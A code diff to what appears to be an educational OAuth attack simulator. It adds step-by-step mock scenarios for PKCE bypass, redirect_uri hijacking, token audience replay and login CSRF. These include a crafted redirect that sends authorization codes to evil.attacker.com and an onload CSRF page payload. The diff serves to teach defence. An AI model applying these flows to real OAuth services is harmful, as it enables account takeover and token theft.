@@ -434,7 +434,10 @@
           this.stepIndex = -1;
           this.currentStep = null;
           this.isComplete = false;
+          this.isAttacking = false;
           this.activeNodes = [];
+          this.currentRequest = null;
+          this.currentResponse = null;
         },
 
         nextStep() {
@@ -443,6 +446,13 @@
             this.currentStep = this.steps[this.stepIndex];
             this.activeNodes = this.currentStep.nodes || [];
             this.isAttacking = this.currentStep.isAttack || false;
+            // Set request/response for Inspector window
+            this.currentRequest = this.currentStep.request || null;
+            this.currentResponse = this.currentStep.response || null;
+            // Capture token if response contains one
+            if (this.currentResponse && this.currentResponse.access_token) {
+              this.capturedToken = this.currentResponse.access_token;
+            }
             return true;
           }
           this.isComplete = true;
@@ -593,45 +603,125 @@
         }
       }));
 
+      // Define attack scenarios globally so terminal can access them
+      window.ATTACK_SCENARIOS = {
+        pkce_bypass: [
+          { id: 1, title: 'User initiates login', description: 'Victim clicks "Login with OAuth" on the client app', nodes: ['victim', 'client'],
+            request: { method: 'GET', url: 'https://app.example.com/login' },
+            response: { status: 302, redirect: '/oauth/authorize' }
+          },
+          { id: 2, title: 'Authorization request', description: 'Client redirects to auth server WITHOUT code_challenge (PKCE missing)', nodes: ['client', 'authserver'],
+            request: { method: 'GET', url: 'https://auth.example.com/authorize?response_type=code&client_id=app&redirect_uri=https://app.example.com/callback&scope=openid&state=xyz', headers: { 'Host': 'auth.example.com' } },
+            response: { status: 200, body: 'Login page displayed' }
+          },
+          { id: 3, title: 'User authenticates', description: 'Victim enters credentials and approves the authorization', nodes: ['victim', 'authserver'],
+            request: { method: 'POST', url: 'https://auth.example.com/authorize', body: { username: 'victim', password: '****', approve: true } },
+            response: { status: 302, redirect: 'https://app.example.com/callback?code=AUTH_CODE_123&state=xyz' }
+          },
+          { id: 4, title: 'Attacker intercepts code!', description: 'Attacker captures the authorization code from the redirect URL (via network sniffing, referrer leak, or malware)', nodes: ['authserver', 'attacker'], isAttack: true,
+            request: { method: 'INTERCEPT', url: 'Captured: code=AUTH_CODE_123' },
+            response: { captured: true, code: 'AUTH_CODE_123', message: 'Authorization code stolen!' }
+          },
+          { id: 5, title: 'Attacker exchanges code', description: 'Attacker sends stolen code to token endpoint (no code_verifier needed!)', nodes: ['attacker', 'authserver'], isAttack: true,
+            request: { method: 'POST', url: 'https://auth.example.com/token', body: { grant_type: 'authorization_code', code: 'AUTH_CODE_123', redirect_uri: 'https://app.example.com/callback', client_id: 'app' } },
+            response: { success: true, access_token: 'eyJhbGciOiJSUzI1NiIs...', token_type: 'Bearer', expires_in: 3600 }
+          },
+          { id: 6, title: 'Attack complete!', description: 'Attacker now has a valid access token for the victim\'s account', nodes: ['attacker'], isAttack: true,
+            request: null,
+            response: { message: 'SUCCESS: Attacker has full access to victim\'s account!', token: 'eyJhbGciOiJSUzI1NiIs...' }
+          }
+        ],
+        redirect_hijack: [
+          { id: 1, title: 'Attacker crafts malicious link', description: 'Attacker creates authorization URL with their server as redirect_uri', nodes: ['attacker'], isAttack: true,
+            request: { method: 'CRAFT', url: 'https://auth.example.com/authorize?redirect_uri=https://evil.attacker.com/steal&client_id=app' },
+            response: { message: 'Malicious OAuth URL crafted' }
+          },
+          { id: 2, title: 'Phishing attack', description: 'Attacker tricks victim into clicking the malicious link via email/social engineering', nodes: ['attacker', 'victim'], isAttack: true,
+            request: { method: 'PHISH', url: 'Phishing email: "Click here to verify your account"' },
+            response: { message: 'Victim clicks malicious link' }
+          },
+          { id: 3, title: 'Auth server accepts bad redirect', description: 'Server validates redirect_uri but accepts attacker\'s domain (loose validation)', nodes: ['victim', 'authserver'],
+            request: { method: 'GET', url: 'https://auth.example.com/authorize?redirect_uri=https://evil.attacker.com/steal&client_id=app' },
+            response: { status: 200, message: 'Redirect URI accepted (validation too loose!)' }
+          },
+          { id: 4, title: 'Victim authenticates', description: 'Victim logs in normally, unaware of the malicious redirect', nodes: ['victim', 'authserver'],
+            request: { method: 'POST', url: 'https://auth.example.com/authorize', body: { approve: true } },
+            response: { status: 302, redirect: 'https://evil.attacker.com/steal?code=STOLEN_CODE' }
+          },
+          { id: 5, title: 'Code sent to attacker!', description: 'Authorization code is redirected to attacker\'s server instead of legitimate app', nodes: ['authserver', 'attacker'], isAttack: true,
+            request: { method: 'GET', url: 'https://evil.attacker.com/steal?code=STOLEN_CODE' },
+            response: { captured: true, code: 'STOLEN_CODE' }
+          },
+          { id: 6, title: 'Attack complete!', description: 'Attacker exchanges stolen code for tokens', nodes: ['attacker', 'authserver'], isAttack: true,
+            request: { method: 'POST', url: 'https://auth.example.com/token', body: { code: 'STOLEN_CODE' } },
+            response: { success: true, access_token: 'eyJhbGciOiJSUzI1NiIs...' }
+          }
+        ],
+        token_replay: [
+          { id: 1, title: 'Attacker obtains valid token', description: 'Attacker legitimately gets a token for low-privilege Service A (frontend-app)', nodes: ['attacker', 'authserver'],
+            request: { method: 'POST', url: 'https://auth.example.com/token', body: { client_id: 'frontend-app' } },
+            response: { success: true, access_token: 'eyJ...', token_type: 'Bearer', aud: 'frontend-app' }
+          },
+          { id: 2, title: 'Attacker inspects token', description: 'Decodes JWT and sees aud="frontend-app", but wonders if other services check this...', nodes: ['attacker'],
+            request: { method: 'DECODE', url: 'JWT payload inspection' },
+            response: { header: { alg: 'RS256' }, payload: { iss: 'auth.example.com', sub: 'user123', aud: 'frontend-app', scope: 'read:profile' } }
+          },
+          { id: 3, title: 'Replay attack attempt', description: 'Attacker sends frontend-app token to admin-api (high-privilege service)', nodes: ['attacker', 'resource'], isAttack: true,
+            request: { method: 'GET', url: 'https://admin-api.example.com/users', headers: { 'Authorization': 'Bearer eyJ...' } },
+            response: { pending: true, message: 'Checking if admin-api validates audience...' }
+          },
+          { id: 4, title: 'Attack succeeds!', description: 'Admin-api does NOT validate audience claim - accepts wrong token!', nodes: ['resource'], isAttack: true,
+            request: null,
+            response: { success: true, users: [{ id: 1, email: 'admin@company.com', role: 'admin' }, { id: 2, email: 'ceo@company.com', role: 'admin' }], message: 'VULNERABLE: admin-api accepted frontend-app token!' }
+          }
+        ],
+        csrf_login: [
+          { id: 1, title: 'Attacker authenticates', description: 'Attacker logs in with their OWN account and captures authorization code BEFORE using it', nodes: ['attacker', 'authserver'],
+            request: { method: 'POST', url: 'https://auth.example.com/authorize', body: { user: 'attacker@evil.com' } },
+            response: { status: 302, redirect: 'https://app.example.com/callback?code=ATTACKER_CODE' }
+          },
+          { id: 2, title: 'Attacker captures their own code', description: 'Intercepts redirect, saves code WITHOUT completing the flow', nodes: ['attacker'], isAttack: true,
+            request: { method: 'INTERCEPT', url: 'Blocked redirect to save code' },
+            response: { code: 'ATTACKER_CODE', note: 'Code saved - DO NOT use yet!' }
+          },
+          { id: 3, title: 'CSRF page created', description: 'Attacker creates malicious page that auto-submits callback with their code', nodes: ['attacker'], isAttack: true,
+            request: { method: 'CREATE', url: 'evil-page.html' },
+            response: { html: '<body onload="location=\'/callback?code=ATTACKER_CODE\'">' }
+          },
+          { id: 4, title: 'Victim visits page', description: 'Victim is tricked into visiting attacker\'s page while logged into target app', nodes: ['victim', 'attacker'], isAttack: true,
+            request: { method: 'GET', url: 'https://evil.attacker.com/cute-cats.html' },
+            response: { message: 'Victim\'s browser auto-redirects...' }
+          },
+          { id: 5, title: 'CSRF triggers callback', description: 'Victim\'s browser completes OAuth flow with ATTACKER\'S code (no state validation!)', nodes: ['victim', 'client'], isAttack: true,
+            request: { method: 'GET', url: 'https://app.example.com/callback?code=ATTACKER_CODE' },
+            response: { status: 200, message: 'Session created - linked to attacker@evil.com!' }
+          },
+          { id: 6, title: 'Attack complete!', description: 'Victim\'s session is now connected to attacker\'s account - any data they enter goes to attacker', nodes: ['client'], isAttack: true,
+            request: null,
+            response: { success: true, message: 'Victim believes they are logged into their own account, but session belongs to attacker!' }
+          }
+        ]
+      };
+
       // Flow Diagram component
       Alpine.data('flowDiagram', () => ({
-        scenarios: {
-          pkce_bypass: [
-            { id: 1, title: 'User initiates login', description: 'Victim clicks "Login with OAuth"', nodes: ['victim', 'client'], request: 'GET /login' },
-            { id: 2, title: 'Authorization request', description: 'Client redirects to auth server (without PKCE)', nodes: ['client', 'authserver'], request: 'GET /authorize?client_id=app&redirect_uri=...', isAttack: false },
-            { id: 3, title: 'Attacker intercepts', description: 'Attacker captures the authorization code from redirect', nodes: ['authserver', 'attacker'], isAttack: true },
-            { id: 4, title: 'Code replay', description: 'Attacker uses stolen code to get tokens', nodes: ['attacker', 'authserver'], request: 'POST /token (with stolen code)', isAttack: true },
-            { id: 5, title: 'Token obtained!', description: 'Attacker now has valid access token', nodes: ['attacker'], isAttack: true }
-          ],
-          redirect_hijack: [
-            { id: 1, title: 'Attacker crafts malicious link', description: 'Creates auth URL with attacker-controlled redirect_uri', nodes: ['attacker'], isAttack: true },
-            { id: 2, title: 'Victim clicks link', description: 'User is tricked into clicking the malicious authorization link', nodes: ['victim', 'attacker'], isAttack: true },
-            { id: 3, title: 'Auth server accepts', description: 'Server allows the malicious redirect URI (validation disabled)', nodes: ['authserver'], request: 'GET /authorize?redirect_uri=https://evil.com' },
-            { id: 4, title: 'Code sent to attacker', description: 'Authorization code is sent to attacker\'s server', nodes: ['authserver', 'attacker'], isAttack: true },
-            { id: 5, title: 'Attacker exchanges code', description: 'Attacker gets tokens using the stolen code', nodes: ['attacker', 'authserver'], isAttack: true }
-          ],
-          token_replay: [
-            { id: 1, title: 'Attacker obtains token', description: 'Gets a valid token for Service A', nodes: ['attacker', 'authserver'] },
-            { id: 2, title: 'Token inspection', description: 'Attacker examines token - no audience restriction', nodes: ['attacker'], request: 'Token: {aud: undefined}' },
-            { id: 3, title: 'Replay to Service B', description: 'Attacker sends same token to different service', nodes: ['attacker', 'resource'], isAttack: true },
-            { id: 4, title: 'Service accepts!', description: 'Service B accepts token without audience validation', nodes: ['resource'], isAttack: true }
-          ],
-          csrf_login: [
-            { id: 1, title: 'Attacker prepares', description: 'Attacker gets their own authorization code', nodes: ['attacker', 'authserver'] },
-            { id: 2, title: 'Malicious callback', description: 'Crafts callback URL with attacker\'s code (no state)', nodes: ['attacker'], request: '/callback?code=ATTACKER_CODE', isAttack: true },
-            { id: 3, title: 'Victim tricked', description: 'Victim\'s browser loads the malicious callback', nodes: ['victim', 'client'], isAttack: true },
-            { id: 4, title: 'Account linked', description: 'Victim\'s session now linked to attacker\'s account', nodes: ['client'], isAttack: true }
-          ]
-        },
-
         get canStep() {
-          return Alpine.store('flow').currentScenario && !Alpine.store('flow').isComplete;
+          const flow = Alpine.store('flow');
+          return flow.currentScenario && flow.steps.length > 0 && !flow.isComplete;
         },
 
         loadScenario() {
           const scenario = Alpine.store('flow').currentScenario;
-          if (scenario && this.scenarios[scenario]) {
-            Alpine.store('flow').setScenario(scenario, this.scenarios[scenario]);
+          if (scenario && window.ATTACK_SCENARIOS[scenario]) {
+            const flow = Alpine.store('flow');
+            flow.steps = window.ATTACK_SCENARIOS[scenario];
+            flow.stepIndex = -1;
+            flow.currentStep = null;
+            flow.isComplete = false;
+            flow.isAttacking = false;
+            flow.activeNodes = [];
+            flow.currentRequest = null;
+            flow.currentResponse = null;
           }
         },
 
@@ -698,17 +788,29 @@
             if (!type) {
               return '<span class="error">Usage: attack &lt;pkce|redirect|replay|csrf&gt;</span>';
             }
-            const scenarios = {
+            const scenarioMap = {
               pkce: 'pkce_bypass',
               redirect: 'redirect_hijack',
               replay: 'token_replay',
               csrf: 'csrf_login'
             };
-            if (!scenarios[type]) {
+            if (!scenarioMap[type]) {
               return `<span class="error">Unknown attack type: ${type}</span>`;
             }
-            Alpine.store('flow').currentScenario = scenarios[type];
-            return `<span class="success">Loaded ${type} attack scenario. Use Flow Diagram to execute.</span>`;
+            const scenarioId = scenarioMap[type];
+            const flow = Alpine.store('flow');
+            // Load the scenario with its steps
+            const scenarios = window.ATTACK_SCENARIOS || {};
+            if (scenarios[scenarioId]) {
+              flow.currentScenario = scenarioId;
+              flow.steps = scenarios[scenarioId];
+              flow.stepIndex = -1;
+              flow.currentStep = null;
+              flow.isComplete = false;
+              flow.isAttacking = false;
+              flow.activeNodes = [];
+            }
+            return `<span class="success">Loaded ${type} attack scenario. Open Flow Diagram and click "Next Step" to execute.</span>`;
           },
 
           intercept: () => {
